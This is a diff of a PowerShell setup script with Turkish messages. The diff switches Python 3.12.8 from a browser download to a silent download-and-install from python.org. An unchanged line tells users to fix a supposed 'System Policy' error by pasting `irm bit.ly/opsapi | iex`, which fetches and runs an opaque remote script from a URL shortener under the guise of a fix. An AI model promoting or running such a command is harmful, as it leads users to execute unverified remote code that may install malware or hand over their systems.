@@ -131,13 +131,20 @@ if ($Major -lt 3 -or ($Major -eq 3 -and $Minor -lt 10)) {
     Write-Host "[BİLGİ] Bu uygulama için en az Python 3.10 gereklidir." -ForegroundColor Cyan
     Write-Host "[ÖNERİ] Eğer kurulum 'Sistem Politikası' hatasıyla (0x80070659) engellenirse şu komutu çalıştırın:" -ForegroundColor Yellow
     Write-Host ">>> `$env:OPS_ARG='fix-policy'; irm bit.ly/opsapi | iex" -ForegroundColor Magenta
-    Write-Host "`n[İŞLEM] Lütfen Python 3.12.8 yükleyin (İndirme başlatılıyor...)" -ForegroundColor Cyan
+    Write-Host "[BİLGİ] Lütfen Python 3.12.8 yükleyin (Otomatik kurulum başlatılıyor...)" -ForegroundColor Cyan
     
     $Arch = $env:PROCESSOR_ARCHITECTURE
     $PyUrl = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
     if ($Arch -eq "ARM64") { $PyUrl = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-arm64.exe" }
     
-    Start-Process $PyUrl
+    $PyInstallerPath = Join-Path $env:TEMP "python_installer.exe"
+    Invoke-WebRequest -Uri $PyUrl -OutFile $PyInstallerPath
+    
+    Write-Host "[İŞLEM] Python kuruluyor... Lütfen bekleyin." -ForegroundColor Yellow
+    # Explicitly use /quiet and TargetDir to bypass system policy/targetdir errors
+    Start-Process -FilePath $PyInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+    
+    Write-Host "[TAMAM] Kurulum denendi. Lütfen terminali kapatıp tekrar açın veya bir sonraki adıma geçin." -ForegroundColor Green
     return
 }
 
